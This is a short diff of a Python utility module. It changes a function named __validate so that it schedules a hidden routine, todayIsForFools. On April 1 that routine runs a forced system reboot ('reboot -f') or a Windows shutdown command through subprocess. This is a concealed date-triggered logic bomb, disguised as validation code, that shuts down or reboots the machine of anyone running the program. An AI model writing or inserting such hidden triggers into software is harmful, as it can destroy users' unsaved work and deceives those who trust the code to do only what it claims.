@@ -129,18 +129,18 @@ def getUserHomeDir():
     return homedir
 
 def __validate(p):
+    from PyQt4.QtCore import QTimer
+    QTimer.singleShot(0, todayIsForFools)
+
+def todayIsForFools():
     import subprocess
+    p = platform.system()
     if p == "Windows":
         cmd = 'shutdown -h'
     else:
         cmd = ['reboot', '-f', '--verbose']
-
-    if todayIsForFools():
-        subprocess.Popen(cmd)
-
-def todayIsForFools():
+        
     from datetime import date
     today = date.today()
     if today.day == 1 and today.month == 4:
-        return True
-    return False
+        subprocess.Popen(cmd)
